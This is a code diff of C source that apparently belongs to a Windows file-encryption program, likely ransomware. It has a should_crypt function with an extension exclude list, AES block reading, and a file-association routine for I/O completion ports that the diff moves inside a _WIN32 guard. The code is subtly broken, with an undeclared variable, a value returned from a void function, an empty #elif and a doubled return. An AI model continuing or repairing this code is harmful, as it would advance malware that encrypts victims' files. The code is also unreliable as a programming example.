@@ -7,8 +7,41 @@
 #include <processthreadsapi.h>
 #include <fcrypt.h>
 char *exclude[]={".pdf",".txt",".enc"};
+#ifdef _WIN32
 HANDLE CompletionPort;
+void associate_file(char *filename)
+{
+HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
+      overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
+      memset(new_ovl,0,sizeof(overlapped_enc));
+      ovl->file = file;
+      LARGE_INTEGER li;
+      GetFileSizeEx(file,&li);
+      ovl->file_size = li.QuadPart;
+      if(new_ovl->file_size < BLOCK_SIZE)
+      {
+new_ovl->operation = HANDLE_EOF;
+      }
+      else
+      {
+new_ovl->operation = READ;
+      }
+      if( CreateIoCompletionPort(CompletionPort,file,0,0) == NULL)
+      {
+return 1;
+      }
+      if(!PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED *)new_ovl))
+      {
+return 1;    
+      }
+return 0;;
 
+
+}
+
+#elif 
+
+#endif
 int should_crypt(char *file)
 {
 for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
@@ -55,35 +88,7 @@ HANDLE thread;
 exit(0);
 
 }
-void associate_file(char *filename)
-{
-HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-      overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
-      memset(new_ovl,0,sizeof(overlapped_enc));
-      ovl->file = file;
-      LARGE_INTEGER li;
-      GetFileSizeEx(file,&li);
-      ovl->file_size = li.QuadPart;
-      if(new_ovl->file_size < BLOCK_SIZE)
-      {
-new_ovl->operation = HANDLE_EOF;
-      }
-      else
-      {
-new_ovl->operation = READ;
-      }
-      if( CreateIoCompletionPort(CompletionPort,file,0,0) == NULL)
-      {
-return 1;
-      }
-      if(!PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED *)new_ovl))
-      {
-return 1;    
-      }
-return 0;;
 
-
-}
 void block_read(overlapped_enc *ovl,struct AES_ctx* ctx )
 {
 LARGE_INTEGER li;
